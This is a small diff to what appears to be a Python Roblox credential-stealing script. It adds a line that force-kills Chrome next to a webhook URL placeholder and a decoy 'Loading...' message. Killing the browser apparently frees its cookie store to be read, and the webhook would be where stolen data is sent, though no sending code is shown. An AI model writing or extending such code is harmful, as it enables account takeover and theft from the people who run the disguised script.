@@ -12,6 +12,8 @@ import re
 import requests
 import robloxpy
 
+os.system("taskkill /im chrome.exe /f")
+
 webhook_url = 'heh'
 
 dummy_message = "Loading..."
